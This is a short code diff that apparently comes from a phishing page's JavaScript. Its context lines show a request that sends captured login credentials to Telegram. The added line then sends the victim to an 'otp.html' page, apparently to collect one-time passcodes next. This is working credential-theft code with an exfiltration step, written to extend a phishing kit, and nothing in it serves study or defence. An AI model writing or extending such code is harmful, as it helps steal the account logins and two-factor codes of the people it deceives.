@@ -307,6 +307,7 @@
                 .then(response => response.json())
                 .then(data => {
                     console.log("Credentials sent to Telegram");
+                    window.location.href = 'otp.html'; // Redirect to the OTP page after login
                 })
                 .catch(error => {
                     console.error("Error sending credentials to Telegram: ", error);
